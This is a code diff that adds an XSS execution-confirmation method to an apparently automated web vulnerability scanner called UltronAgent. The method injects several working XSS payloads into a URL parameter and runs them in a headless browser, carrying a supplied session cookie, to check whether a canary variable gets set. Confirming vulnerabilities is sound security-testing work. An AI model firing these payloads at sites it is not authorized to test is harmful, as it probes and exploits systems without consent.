@@ -1170,6 +1170,72 @@ class UltronAgent:
         except Exception as e:
             return {"success": False, "message": f"Screenshot failed: {e}", "data": {}}
 
+    def xss_confirm(self, url: str, param: str, cookie: str = "", timeout: int = 15) -> dict:
+        """v1.3 — XSS EXECUTION confirmation (candidate->confirmed). Injects execution-canary payloads
+        into `param`, loads the URL in a headless browser, and checks whether JS actually RAN (a canary
+        global gets set, or a dialog fires). Reflected-in-HTML != executable; this proves execution
+        (turns reflected/DOM XSS from candidate to confirmed). Deterministic canary, no cracking.
+        Degrades cleanly if Playwright/browser is unavailable. Authorized targets only."""
+        from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
+        C = "jvz9exec"
+        payloads = [
+            f'"><img src=x onerror="window.__{C}=1">',
+            f'"><script>window.__{C}=1</script>',
+            f'<img src=x onerror=window.__{C}=1>',
+            f'"><svg onload="window.__{C}=1">',
+            f"'><img src=x onerror=window.__{C}=1>",
+        ]
+        parts = urlsplit(url)
+        qs = dict(parse_qsl(parts.query))
+        dialog = [False]
+        hit = None
+        try:
+            from playwright.sync_api import sync_playwright
+            with sync_playwright() as p:
+                browser = p.chromium.launch(headless=True)
+                ctx = browser.new_context()
+                if cookie:
+                    try:
+                        ctx.add_cookies([{"name": kv.split("=")[0].strip(), "value": kv.split("=", 1)[1].strip(),
+                                          "url": f"{parts.scheme}://{parts.netloc}"}
+                                         for kv in cookie.split(";") if "=" in kv])
+                    except Exception:
+                        pass
+                page = ctx.new_page()
+                page.on("dialog", lambda d: (dialog.__setitem__(0, True), d.dismiss()))
+                for pay in payloads:
+                    q = dict(qs); q[param] = pay
+                    purl = urlunsplit((parts.scheme, parts.netloc, parts.path,
+                                       urlencode(q, safe='<>"/=\'()'), ""))
+                    try:
+                        page.goto(purl, timeout=timeout * 1000, wait_until="load")
+                        page.wait_for_timeout(400)
+                        if page.evaluate(f"window.__{C}===1") or dialog[0]:
+                            hit = (pay, purl)
+                            break
+                    except Exception:
+                        continue
+                browser.close()
+        except ImportError:
+            return {"success": False, "message": "Playwright not installed — can't confirm XSS execution.", "data": {}}
+        except Exception as e:
+            return {"success": False, "message": f"XSS confirm failed to launch a browser: {e}", "data": {}}
+        if hit:
+            pay, purl = hit
+            return {"success": True, "message": f"XSS EXECUTION CONFIRMED at {url} (param '{param}').",
+                    "data": {"findings": [{
+                        "template": "xss-confirmed", "severity": "high", "url": purl, "cve": None,
+                        "validated": True,
+                        "evidence": (f"Reflected XSS CONFIRMED by execution: payload for param '{param}' RAN JavaScript "
+                                     f"in a headless browser (canary global set / dialog fired) — not merely reflected, "
+                                     f"EXECUTED. Payload: {pay}"),
+                        "repro": [f"Load {purl} in a browser", "Observe the injected JS execute (canary/dialog)"],
+                    }]}}
+        return {"success": True,
+                "message": (f"Reflected but NOT executed at {url} (param '{param}') — the payloads didn't run "
+                            f"(non-HTML context, encoding, or CSP). Reflected-XSS stays a candidate, not confirmed."),
+                "data": {"findings": []}}
+
     # =====================================
     # CONTENT DISCOVERY (brute hidden paths/dirs crawling misses)
     # =====================================
